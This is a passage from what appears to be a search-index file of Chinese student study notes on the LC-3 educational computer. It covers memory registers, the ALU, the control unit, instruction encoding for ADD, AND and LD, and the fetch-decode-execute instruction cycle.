\u5199\uff1a\u5148\u5c06\u8981\u8bbf\u95ee\u7684\u5185\u5b58\u5355\u5143\u7684\u5730\u5740\u6570\u636e\u653e\u5230MAR\u4e0a\uff0c\u518d\u628a\u8981\u5199\u7684\u6570\u636e\u653e\u5230MDR\u4e0a\uff0c\u7136\u540e\u5c06MDR\u4e0a\u7684\u6570\u636e\u5199\u5230\u90a3\u5757\u5185\u5b58\u91cc</p> <p>processing unit</p> <p>\u5904\u7406\u5355\u5143\u662f\u6570\u636e\u771f\u6b63\u88ab\u5904\u7406\u7684\u5730\u65b9 \u73b0\u4ee3\u7684\u5904\u7406\u5355\u5143\u5df2\u7ecf\u53d1\u5c55\u5f97\u5f88\u590d\u6742\u4e86\uff0c\u5185\u90e8\u6709\u5f88\u591a\u529f\u80fd\u5355\u5143\uff0c\u6709\u9664\u6cd5\uff0c\u5e73\u65b9\u7b49\u529f\u80fd \u5176\u4e2dALU\u662f\u6700\u57fa\u672c\u7684\u529f\u80fd\u5355\u5143\uff0c\u4e5f\u662f\u6700\u521d\u7684\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u7684\u552f\u4e00\u529f\u80fd\u5355\u5143 \u53ef\u4ee5\u505aADD \u548c AND OR\u7b49\u7b80\u5355\u7684\u903b\u8f91\u8fd0\u7b97 \u5728LC-3\u4e2d\u4e5f\u6709\u7b80\u5355\u7684ALU\uff0c\u53ef\u4ee5\u505aADD AND      not</p> <p>ALU\u6240\u80fd\u5904\u7406\u7684\u91cf\u5316\u5927\u5c0f\uff08size of quantity\uff09 \u901a\u5e38\u88ab\u79f0\u4e3a\u8ba1\u7b97\u673a\u7684\u5b57\u957f\uff08word length\uff09\u91cf\u5316\u7684\u57fa\u672c\u5355\u5143\u79f0\u4e3a\u5b57words \u6bd4\u5982\u4e24\u4e2awords\u53ef\u4ee5\u505aADD\u64cd\u4f5c \u8f93\u51fa\u4e00\u4e2aword</p> <p>\u6bcf\u4e00\u4e2aISA\u90fd\u6709\u81ea\u5df1\u7684\u5b57\u957f\uff0c\u53d6\u51b3\u4e8e\u8ba1\u7b97\u673a\u7684\u9884\u671f\u7528\u9014</p> <p>LC-3 \u91cc\u7684ALU\u5904\u740616bits\u7684word</p> <p>\u901a\u5e38\u5728\u8bbe\u8ba1\u4e2d\uff0c\u4f1a\u5728ALU\u65c1\u8fb9\u653e\u7f6e\u4e00\u5b9a\u6570\u91cf\u7684\u5bc4\u5b58\u5668\uff0c\uff08\u8ba1\u7b97\uff083+2\uff09*8\uff09\u7528\u4e8e\u5b58\u653e\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u7684\u4e34\u65f6\u53d8\u91cf \u4ee5\u514d\u5f15\u8d77\u8fc7\u591a\u7684\u5185\u5b58\u8bbf\u95ee\uff0c\u6bcf\u4e00\u5bc4\u5b58\u5668\u4e00\u822c\u80fd\u5b58\u653e\u4e00\u4e2aword \u5728LC-3\u4e2d\uff0c\u5728ALU\u65c1\u8fb9\u4e00\u5171\u6709R0\u5230R7\u8fd9\u6837\u516b\u4e2a\u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a\u90fd\u662f16bits</p> <p>input and output</p> <p>\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\u5728\u8ba1\u7b97\u673a\u4e2d\u5e38\u5e38\u88ab\u79f0\u4e3aperipheral(\u5916\u56f4\u8bbe\u5907), \u6709\u65f6\u4e5f\u53eb\u4ed6\u4eec\u8ba1\u7b97\u673a\u7684accessories \u9644\u5c5e\u8bbe\u5907\uff0c\u4f46\u662f\u5b83\u4eec\u540c\u6837\u91cd\u8981</p> <p>\u5728LC-3\u4e2d\uff0c\u4f1a\u6709\u4e24\u4e2a\u57fa\u7840\u7684\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff0c\u8f93\u5165\u8bbe\u5907\u4e3a\u952e\u76d8keyboard\uff0c\u8f93\u51fa\u8bbe\u5907\u4e3a\u663e\u793a\u5c4fmonitor\u3002</p> <p>\u6700\u65e9\u7684\u8f93\u5165\u8bbe\u5907\u8f93\u51fa\u8bbe\u5907\u4e3apunched cards \u6253\u5b54\u7eb8\u5e26</p> <p>control unit</p> <p>\u63a7\u5236\u5355\u5143\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u7684\u6bcf\u4e00\u6b65\u548c\u6307\u4ee4\u6267\u884c\u7684\u6bcf\u4e00\u6b65</p> <p>\u63a7\u5236\u5355\u5143\u91cc\u6709\u51e0\u4e2a\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff0c instruction register \uff08\u6307\u4ee4\u5bc4\u5b58\u5668\uff09\u6765\u5b58\u50a8\u6b63\u5728\u88ab\u6267\u884c\u7684\u6307\u4ee4 instruction pointer\uff08\u7a0b\u5e8f\u6307\u9488\uff09\u6765\u5b58\u50a8\u4e0b\u4e00\u6761\u5f85\u5904\u7406\u7684\u6307\u4ee4 \u6709\u65f6\u4e5f\u628a\u8fd9\u4e2a\u5bc4\u5b58\u5668\u79f0\u4e3aprogram counter\uff0c\u5176\u672c\u8eab\u5c31\u662f\u5e94\u8be5\u5b58\u50a8\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#lc-3-an-example-von-neumann-machine","title":"LC-3 an example von neumann machine","text":"<p>\u200b\u200b</p> <p>\u8fd9\u5f20\u56fe\u663e\u793a\u4e86LC-3\u7684\u5b8c\u6574\u6570\u636e\u901a\u8def\uff0c\u5176\u4e2d\u7684\u7a7a\u767d\u7bad\u5934\u4ee3\u8868\u7684\u662f\u63a7\u5236\u6307\u4ee4control signals \u9ed1\u8272\u7bad\u5934\u4ee3\u8868\u7684\u662f\u6570\u636e\u4f20\u9012data elements</p> <p>LC-3\u91cd\u8981\u90e8\u4ef6\u4ecb\u7ecd</p> <p>memory \u5305\u62ec\u4e86\u5b58\u50a8\u5355\u5143\uff0cMAR\u548cMDR\u5bc4\u5b58\u5668\uff0cMAR\u662f16\u4f4d\u7684\uff0c\u8bf4\u660e\u6700\u5927\u53ef\u5bfb\u5740\u7a7a\u95f4\u662f2^16   \u200b^ MDR\u662f16\u4f4d\u7684\uff0c\u8bf4\u660e\u4eec\u6bcf\u4e2a\u5b58\u50a8\u5355\u5143\u5b58\u50a816\u4f4dbits</p> <p>input and output\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff0c\u6700\u7b80\u5355\u7684\u952e\u76d8\u8f93\u5165\u8bbe\u5907\u9700\u8981\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0cKBDR\u5b58\u50a8\u8f93\u5165\u7684ASCII\uff0cKBSR\u5b58\u50a8\u952e\u76d8\u6572\u51fb\u7684\u88c5\u586b\uff1b\u6700\u7b80\u5355\u7684\u663e\u793a\u5668\u8f93\u51fa\u4e5f\u9700\u8981\u4e24\u4e2a\u5bc4\u5b58\u5668DDR\u4fdd\u5b58\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u7684ASCII\uff0cDSR\u5b58\u50a8\u76f8\u5173\u7684\u72b6\u6001\u4fe1\u606f</p> <p>process unit \u5904\u7406\u5355\u5143\uff0c\u5305\u62ec\u4e86\u4e00\u4e2aALU\u548c\u516b\u4e2a\u5bc4\u5b58\u5668 lc-3\u7684ALU\u53ea\u5b9e\u73b0\u4e86ADD AND OR</p> <p>control unit \u63a7\u5236\u5355\u5143 \u5305\u542b\u4e86\u6240\u6709\u4e0e\u4fe1\u606f\u5904\u7406\u76f8\u5173\u7684\u7ed3\u6784 \u5176\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u7ed3\u6784\u662f\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u673a\uff0c\u5b83\u6709\u51e0\u4e2a\u91cd\u8981\u7684\u8f93\u5165 CLK \u786e\u5b9a\u4e86\u6307\u4ee4\u5468\u671f\u6709\u591a\u957f IR \u786e\u5b9a\u4e86\u8981\u6267\u884c\u54ea\u4e9b\u6d3b\u52a8 PC \u786e\u5b9a\u4e86\u4e0b\u4e00\u6b65\u8981\u6267\u884c\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u4e5f\u5373\u524d\u6587\u63d0\u5230\u7684\u7a0b\u5e8f\u6307\u9488</p> <p>\u6709\u9650\u72b6\u6001\u673a\u7684\u5168\u90e8\u8f93\u51fa\u6307\u4ee4\u5747\u4e3a\u7a7a\u767d\u6307\u4ee4\uff0c\u4e5f\u5373\u5b83\u8f93\u51fa\u7684\u90fd\u662f\u63a7\u5236\u6307\u4ee4\uff0c\u63a7\u5236\u7740\u6574\u4e2a\u8ba1\u7b97\u673a\u7684\u8fd0\u884c \u4f8b\u5982ALUK\u8f93\u51fa\u786e\u5b9a\u7740ALU\u7684\u72b6\u6001\u662fADD NOT \u8fd8\u662f AND \u518d\u4f8b\u5982GateALU\uff0c\u786e\u5b9a\u7740ALU\u7684\u8f93\u51fa\u662f\u5426\u8f93\u51fa\u5230\u5904\u7406\u5668\u603b\u7ebf</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#instruction-processing","title":"instruction processing","text":"<p>\u51af\u8bfa\u4f9d\u66fc\u6a21\u578b\u7684\u601d\u60f3\u5728\u4e8e\u6570\u636e\u548c\u7a0b\u5e8f\u90fd\u4ee5bit\u6d41\u7684\u5f62\u5f0f\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u5728\u63a7\u5236\u5355\u5143\u7684\u63a7\u5236\u4e0b\uff0c\u4f9d\u6b21\u5b8c\u6210\u6307\u4ee4\u7684\u8bfb\u53d6\u548c\u6267\u884c</p> <p>what is instruction</p> <p>\u6307\u4ee4instruction is the most basic unit of computer processing. \u6307\u4ee4\u6709\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u4e2a\u662fopcode \u64cd\u4f5c\u7801\uff08\u505a\u4ec0\u4e48\uff09\uff1b\u4e00\u4e2a\u662f operand\u64cd\u4f5c\u6570\uff08\u5bf9\u8c01\u505a\uff09</p> <p>\u5728LC-3\u4e2d\uff0c\u5176\u6307\u4ee4\u957f\u5ea6\u4e3a16 \u4ece\u5de6\u5230\u53f3\u7f16\u53f7\u4e3abit[15]-bit[0]\uff0c\u5176\u4e2dbit[15]-bit[12]\u662f\u64cd\u4f5c\u7801\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2a\u6307\u4ee4\u6700\u591a\u67092^4^\u79cd\u64cd\u4f5c\u7c7b\u578b bit[11]-bit[0]\u5219\u8868\u793a\u64cd\u4f5c\u6570</p> <p>\u4e3e\u4f8b\u8bf4\u660e\uff0c\u4f8b\u5982</p> <p>\u52a0\u6cd5\u6307\u4ee4ADD \u64cd\u4f5c\u7801\u4ece\u5de6\u5230\u53f3\u4e3a0001 \u9700\u8981\u4e24\u4e2a\u76f8\u52a0\u6570\u548c\u4e00\u4e2a\u6c42\u548c\u7ed3\u679c\uff0c\u5176\u67098\u4e2a\u5bc4\u5b58\u5668\uff0cADD\u6307\u4ee4\u8981\u6c42\u8fd9\u4e24\u4e2a\u76f8\u52a0\u6570\u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u662f\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u7ed3\u679c\u4e5f\u5fc5\u987b\u5b58\u653e\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u56e0\u4e3a\u5bc4\u5b58\u5668\u4e3a8\u4e2a\uff0c\u6240\u4ee5\u8868\u793a\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u4e3a8\u4f4d</p> <p>\u200b</p> <p>\u200b\u200b</p> <p>11\u4f4d\u52309\u4f4d\u8868\u793a\u7684\u662f\u7ed3\u679c\u7684\u5b58\u50a8\u76ee\u6807 \u8fd9\u91cc\u6307\u5b58\u50a8\u5728R6\u8fd9\u4e2a\u5bc4\u5b58\u5668\u4e0a 8\u4f4d\u52306\u4f4d\u8868\u793a\u7684\u5176\u4e2d\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\uff0c\u4e5f\u5373\u76f8\u52a0\u6570\u4e4b\u4e00\uff0c\u8fd9\u91cc\u6307R2</p> <p>\u57285\u4f4d\u4e2d\u4e24\u4e2a\u6307\u4ee4\u5c55\u73b0\u51fa\u4e0d\u540c\uff0c \u5f535\u4f4d\u662f0\u65f6\uff0c\u8868\u793a\u53e6\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u4e5f\u662f\u5728\u5bc4\u5b58\u5668\u4e0a\uff0c\u5bc4\u5b58\u5668\u7684\u7531\u7b2c2\u4f4d\u52300\u4f4d\u786e\u5b9a\uff0c\u5728\u7b2c\u4e00\u6761\u6307\u4ee4\u4e0a\u8868\u793aR6 \u5f535\u4f4d\u662f1\u65f6\uff0c\u53e6\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u4f1a\u628a4\u4f4d\u52300\u4f4d\u8fd9\u4e94\u4f4d\u6570\u5e26\u7b26\u53f7\u6269\u5c55\uff08sign-extending\uff09\u4e3a16\u4f4d\u6570\u5b57\uff0c\u5728\u6b64\u5904\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\u4e2d\uff0c00110\u5c31\u662f\u8868\u793a\u6b63\u6574\u65706</p> <p>\u6240\u4ee5\u4e24\u4e2a\u6307\u4ee4\u7684\u542b\u4e49\u5f88\u660e\u786e\u4e86\uff0c\u5c06R2\u548cR6\u7684\u5185\u5bb9\u76f8\u52a0\u7ed3\u679c\u5b58\u5230R6\u4e0a \u5c06R2\u7684\u5185\u5bb9\u52a0\u4e0a6\u5b58\u50a8\u5230R6\u4e0a</p> <p>AND instruction</p> <p>AND\u64cd\u4f5c\u548cADD\u64cd\u4f5c\u975e\u5e38\u76f8\u4f3c</p> <p>\u200b\u200b</p> <p>\u64cd\u4f5c\u6570\u662fR3\u548c\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cfimmediate value 0 \u8fdb\u884c\u9010\u4f4d\u7684and\u64cd\u4f5c\uff0c\u6700\u7ec8\u4f1a\u4ea7\u751f\u4e00\u4e2a16\u4f4d\u76840\uff0c\u5c06\u5176\u5b58\u5165R2\u4e2d\uff0c\u8fd9\u79cd\u64cd\u4f5c\u4e5f\u662f\u7ecf\u5178\u7684\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u5c06\u5bc4\u5b58\u5668R2\u521d\u59cb\u5316\u4e3a16\u4f4d0</p> <p>LD instruction</p> <p>LD\u6307\u4ee4\u7684\u542b\u4e49\u662f\u8bfb\u53d6\u6307\u4ee4\uff0c\u9700\u8981\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0c\u5176\u6548\u679c\u4e3a\u5230\u5185\u5b58\u7684\u4e00\u4e2a\u7279\u5b9a\u7684\u5730\u65b9\uff0c\u8bfb\u53d6\u5176\u4e2d\u7684\u5185\u5bb9\uff0c\u5c06\u5176\u5185\u5bb9\u5b58\u50a8\u5230\u4e00\u4e2a\u5bc4\u5b58\u5668\u4e2d\u3002 \u5176\u4e2d\u4e24\u4e2a\u64cd\u4f5c\u6570\u8868\u793a\u8981\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u5230\u7684\u503c\u548c\u5728\u6307\u4ee4\u5b8c\u6210\u4e4b\u540e\u5c06\u5305\u542b\u8be5\u503c\u7684\u76ee\u6807\u5bc4\u5b58\u5668  </p> <p>\u6709\u5f88\u591a\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53bb\u8ba1\u7b97\u5185\u5b58\u7684\u4f4d\u7f6e\uff0c\u6bcf\u79cd\u65b9\u5f0f\u90fd\u79f0\u4e3a\u4e00\u79cd\u5bfb\u5740\u6a21\u5f0faddressing mode \u7528opcode\u64cd\u4f5c\u6570LD\u53bb\u786e\u5b9a\u5185\u5b58\u4f4d\u7f6e\u7684\u65b9\u5f0f\u88ab\u79f0\u4e3aPC+offset \u5728LC-3\u4e2d\u8fd8\u6709\u5176\u4ed6\u7684\u5bfb\u5740\u6a21\u5f0f</p> <p>\u200b\u200b</p> <p>\u8fd9\u662fLC-3\u4e0a\u7684\u4e00\u6761LD\u64cd\u4f5c\u6307\u4ee4</p> <p>LD\u7684\u64cd\u4f5c\u7801\u4e3a0010 11\u4f4d\u52309\u4f4d\u8868\u793a\u6307\u4ee4\u6267\u884c\u540e\u8981\u5b58\u50a8\u88ab\u8bfb\u53d6\u7684\u5185\u5bb9\u7684\u5bc4\u5b58\u5668\uff0c\u8fd9\u91cc\u6307R2 8\u4f4d\u52300\u4f4d\u7528\u6765\u8ba1\u7b97\u8981\u8bfb\u53d6\u7684\u5185\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u5bfb\u5740\u6a21\u5f0f\u662fPC+offset\uff0cPC\u6211\u4eec\u77e5\u9053\u662f \u6307\u4ee4\u6307\u9488\uff0c\u4e5f\u5373\u4e0b\u4e00\u6761\u8981\u8fdb\u884c\u7684\u6307\u4ee4\u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u5b8c\u6574\u6307\u4ee4\u7684\u542b\u4e49\u5c31\u662f\u5bf98\u4f4d\u52300\u4f4d\u770b\u505a\u4e00\u4e2a\u4e8c\u8fdb\u5236\u8865\u7801\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884csign-extend \u8865\u621016\u4f4d\uff0c\u5728\u8fd9\u91cc\u5341\u8fdb\u5236\u8868\u793a\u4e3a198\uff0c\u5c06198\u52a0\u5230\u6307\u4ee4\u6307\u9488\u4e2d\u6765\u627e\u5230\u90a3\u4e2a\u5185\u5b58\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u5c06\u5176\u5185\u5bb9\u8bfb\u53d6\u5b58\u653e\u5230R2\u4e2d</p> <p>\u56e0\u4e3a\u662f\u8865\u7801\uff0c\u5f53\u7136\u53ef\u4ee5\u662f\u8d1f\u6570</p> <p>the instruction cycle \u6307\u4ee4\u5468\u671f</p> <p>\u6240\u8c13\u6307\u4ee4\u5468\u671f\u5c31\u662f\u4e00\u4e2a\u6307\u4ee4\u7684\u5904\u7406\u8fc7\u7a0b\uff0c\u6307\u4ee4\u7684\u5904\u7406\u662f\u5728\u63a7\u5236\u5355\u5143\u7684\u63a7\u5236\u4e0b\uff0c\u7cbe\u51c6\u5730\u4e00\u6b65\u6b65\u5b8c\u6210\u7684\uff0c\u5176\u4e00\u822c\u5206\u4e3a6\u4e2a\u6b65\u9aa4\uff08six phases\uff09\uff0c\u5927\u591a\u6570\u8ba1\u7b97\u673a\u5982\u6b64\uff0c\u6709\u4e9b\u8ba1\u7b97\u673a\u53ef\u80fd\u5728\u67d0\u4e9b\u6307\u4ee4\u4e0b\u4f1a\u8df3\u8fc7\u90e8\u5206\u6b65\u9aa4\uff1f</p> <p>\u8fd9\u516d\u4e2a\u6b65\u9aa4\u4e3afetch\uff0c decode\uff0c evaluate address\uff0c fetch operand\uff0c execute\uff0c store result \u6211\u4eec\u4ee5LC-3\u7684data  path\uff08\u6570\u636e\u603b\u7ebf\uff09\u4e3a\u4f8b\uff0c\u4ecb\u7ecd\u8fd9\u4e9b\u6b65\u9aa4</p> <p>FETCH \u53d6\u6307\u4ee4</p> <p>\u53d6\u6307\u4ee4\u7684\u64cd\u4f5c\u5982\u4e0b 1.MAR\u4e2d\u8f7d\u5165PC\u6307\u4ee4\u6307\u9488\u91cc\u7684\u5185\u5bb9 2.\u8bbf\u95ee\u5185\u5b58\uff0c\u7528MAR\u91cc\u7684\u5185\u5bb9\uff0c\u4e5f\u5373\u4e0b\u4e00\u6761\u6307\u4ee4\u91cc\u7684\u5730\u5740\uff0c\u8fdb\u884c\u5185\u5b58\u8bbf\u95ee\uff0c\u5c06\u5185\u5b58\u91cc\u7684 \u5185\u5bb9\u8bfb\u5165MDR\u4e2d 3.IR\u5bc4\u5b58\u5668\u4e2d\u8f7d\u5165MDR\u4e2d\u7684\u5185\u5bb9</p> <p>\u6b64\u65f6\u6211\u4eec\u5e94\u5f53\u5df2\u7ecf\u53ef\u4ee5\u8fdb\u5165\u4e0b\u4e00\u73af\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5e0c\u671b\u6b64\u65f6\u5c06PC\u7684\u5185\u5bb9\u4fee\u6539\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4ee5\u4fbf\u4e00\u4e0b\u4e2a\u6307\u4ee4\u5468\u671f\u5f00\u59cb\u7684\u65f6\u5019\u53ef\u4ee5\u8fc5\u901f\u5f00\u59cb\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981fetch\u64cd\u4f5c\u8fdb\u884c\u4fee\u6539\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728MAR\u8f7d\u5165\u4e86PC\u5185\u5bb9\u4e4b\u540e\uff0c\u5bf9PC\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u79cd\u64cd\u4f5c\u8bb0\u4e3aPC\u589e\u91cfincrement the PC</p> <p>\u5728fetch\u8fc7\u7a0b\u4e2d\uff0c\u64cd\u4f5c1\u548c\u64cd\u4f5c3\u90fd\u82b1\u8d39\u4e00\u4e2aclock cycle \u64cd\u4f5c2\u4f1a\u82b1\u8d39\u591a\u4e2aclock cycle\uff0c\u8fd9\u4f9d\u8d56\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u8bbf\u95ee\u7684\u901f\u5ea6</p> <p>DECODE \u8bd1\u7801</p> <p>\u7528\u4e8e\u5206\u6790\u548c\u68c0\u67e5\u6307\u4ee4\u7684\u7c7b\u578b\uff0c\u5e76\u786e\u5b9a\u5bf9\u5e94\u7684\u5fae\u7ed3\u6784\u64cd\u4f5c\u7ec6\u8282</p> <p>LC-3\u91c7\u75284-to-16 decoder\u8bd1\u7801\u5668\u6765\u8fdb\u884c\u8bd1\u7801\u64cd\u4f5c\uff0c\u5982\u524d\u6587\u6240\u8ff0\uff0cLC-3\u4e2d\u64cd\u4f5c\u7801\u7684\u4f4d\u6570\u4e3a4\uff0c\u4e5f\u5c31\u662f\u8bf4\u670916\u79cd\u64cd\u4f5c\uff0c\u901a\u8fc7\u8bd1\u7801\u5668\uff0c\u53ef\u4ee5\u4f7f16\u6761\u64cd\u4f5c\u7ebf\u4e2d\u53ea\u6709\u4e00\u6761\u662f\u53ef\u884c\u7684 \u5728\u8fd916\u79cdoutput\u4e2d\u5269\u4e0b12\u4f4d\u4e5f\u4f1a\u88ab\u4e0d\u540c\u5730\u89e3\u91ca</p> <p>EVALUATE ADDRESS \u5730\u5740\u8ba1\u7b97</p> <p>\u5982\u679c\u6307\u4ee4\u6267\u884c\u65f6\u9700\u8981\u5730\u5740\u8ba1\u7b97\u5de5\u4f5c\uff0c\u5219\u5728\u8fd9\u4e2a\u73af\u8282\u8fdb\u884c\u3002</p> <p>\u4ee5LD\u6307\u4ee4\u4e3a\u4f8b\uff0c\u5728LD\u4e2d\u9700\u8981\u627e\u5230\u5185\u5b58\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u8981\u628a8\u4f4d\u52300\u4f4d\u7684\u6570\u636esign-extend\u4e4b\u540e\u52a0\u5230PC\u7684\u73b0\u6709\u503c\u4e0a\uff0c\u8fd9\u4e2a\u8ba1\u7b97\u5728\u6b64\u73af\u8282\u8fdb\u884c\u3002\u6211\u4eec\u4e5f\u6ce8\u610f\u5230\u4e0d\u662f\u6240\u6709\u6307\u4ee4\u90fd\u9700\u8981\u8fd9\u4e2a\u73af\u8282\uff0c\u6bd4\u5982\u524d\u6587\u63d0\u5230\u7684AND\u548cADD\u6307\u4ee4\uff0c\u5982\u679c\u53ea\u6709\u5bc4\u5b58\u5668\u548c\u4e34\u65f6\u7684value\u8fdb\u884c\u64cd\u4f5c\uff0c\u5c31\u65e0\u9700\u8fd9\u4e2a\u73af\u8282</p> <p>FETCH OPERANDS \u53d6\u64cd\u4f5c\u6570</p> <p>\u8fd9\u4e2a\u73af\u8282\u662f\u7528\u6765\u8bfb\u53d6\u9700\u8981\u7684\u64cd\u4f5c\u6570\u7684</p> <p>\u4ee5LD\u6307\u4ee4\u4e3a\u4f8b\uff0c\u8fd9\u4e2a\u73af\u8282\u53ef\u4ee5\u5206\u4e3a\u4e24\u6b65\uff0c\u7528\u524d\u4e00\u73af\u8282\u8ba1\u7b97\u7684address\u53bb\u52a0\u8f7dMAR\uff0c\u7136\u540e\u8bfb\u53d6\u5185\u5b58\uff0c\u5c06\u64cd\u4f5c\u6570\uff08\u5185\u5b58\u91cc\u7684\u5185\u5bb9\uff09\u653e\u5728MDR</p> <p>\u4ee5ADD\u6307\u4ee4\u4e3a\u4f8b\uff0c\u6211\u4eec\u5c31\u662f\u8981\u53bb\u83b7\u53d6R2\u548cR6\u91cc\u7684\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0c\u4f46\u73b0\u5728\u5927\u591a\u8ba1\u7b97\u673a\u652f\u6301\u5728\u4e0b\u4e00\u6b65\u6267\u884c\u7684\u65f6\u5019\u540c\u65f6\u8fdb\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4ee5\u52a0\u5feb\u8ba1\u7b97\u673a\u8fd0\u884c\u7684\u901f\u5ea6</p> <p>EXECUTE \u6267\u884c</p> <p>\u6267\u884c\u6307\u4ee4</p> <p>\u4ee5ADD\u4e3a\u4f8b\uff0c\u5c31\u662f\u6267\u884cALU\u4e2d\u7684addition</p> <p>STORE RESULT \u5b58\u653e\u7ed3\u679c</p> <p>\u5c06\u6307\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u653e\u5230\u8bbe\u5b9a\u597d\u7684\u4f4d\u7f6e</p> <p>\u5728ADD\u64cd\u4f5c\u4e2d\u5c31\u662f\u5b58\u5230\u8bbe\u5b9a\u597d\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u4f46\u662f\u5728\u5927\u591a\u6570\u7684\u8ba1\u7b97\u673a\uff0c\u5305\u62ecLC-3\u4e2d\uff0c\u8fd9\u4e2a\u73af\u8282\u4e5f\u53ef\u4ee5\u548c\u4e0a\u4e00\u73af\u8282\u4e00\u8d77\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53d6\u64cd\u4f5c\u6570\uff0c\u6267\u884c\uff0c\u5b58\u653e\u7ed3\u679c\u5728\u540c\u4e00\u4e2aclock cycle\u4e2d</p> <p>\u5728\u6307\u4ee4\u5468\u671f\u7ed3\u675f\u4e4b\u540e\uff0c\u63a7\u5236\u5355\u5143\u5c31\u9a6c\u4e0a\u8981\u5f00\u59cb\u4e0b\u4e00\u4e2a\u6307\u4ee4\u5468\u671f\u7684\u8fd0\u884c\uff0c\u5176\u4e2dPC\u5df2\u7ecf\u5728\u4e0a\u4e00\u5468\u671f\u88ab\u81ea\u52a8\u4fee\u6539\u6210\u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</p> <p>\u8ba1\u7b97\u673a\u7684\u6307\u4ee4\u6267\u884c\u662f\u987a\u5e8f\u6267\u884c sequential flow \u987a\u5e8f\u6d41\u4f1a\u4e00\u76f4\u8fdb\u884c\u76f4\u5230\u88ab\u6253\u7834\u6216\u8005\u7a0b\u5e8f\u7ec8\u6b62\uff1f</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#change-the-sequence-of-execution","title":"change the sequence of execution","text":"<p>\u5728\u987a\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5305\u542b\u4e24\u79cd\u6307\u4ee4\u7c7b\u578b\uff0c \u4e00\u79cd\u662foperate instruction \u64cd\u4f5c\u6307\u4ee4 \u4f8b\u5982ADD \u4e00\u79cd\u662fdata movemet instruction \u6570\u636e\u642c\u79fb\u6307\u4ee4 \u4f8b\u5982LC \u6709\u4e9b\u6307\u4ee4\u540c\u65f6\u662f\u8fd9\u4e24\u79cd\u6307\u4ee4\u7c7b\u578b</p> <p>\u4f46\u6211\u4eec\u8fd8\u6709\u7b2c\u4e09\u79cd\u6307\u4ee4\u7c7b\u578b\uff0ccontrol instruction \u63a7\u5236\u6307\u4ee4\uff0c\u5176\u4f1a\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u987a\u5e8f \u6bd4\u5982\u6211\u4eec\u5e0c\u671b\u53cd\u590d\u6267\u884c\u4e00\u7ec4\u6307\u4ee4\u6216\u8005\u6211\u4eec\u5e0c\u671b\u6539\u53d8\u6307\u4ee4\u6267\u884c\u7684\u987a\u5e8f\uff08\u4e0d\u662f\u6539\u53d8\u6307\u4ee4\u5185\u90e8\u73af\u8282\u7684\u987a\u5e8f\uff09</p> <p>\u5b83\u901a\u8fc7\u5728\u6267\u884c\u73af\u8282\u6539\u53d8PC\u7684\u503c\uff0c\u8986\u76d6\u4e4b\u524d\u53d6\u6307\u4ee4\u73af\u8282\u4e2dPC+1\u7684\u503c\uff0c\u4ece\u800c\u8fbe\u5230\u4e86\u63a7\u5236\u6307\u4ee4\u6267\u884c\u987a\u5e8f\u7684\u76ee\u7684</p> <p>\u4ee5\u5e38\u89c1\u7684control instruction BR\uff08conditional branch\uff09\u6761\u4ef6\u5206\u652f\u4e3a\u4f8b 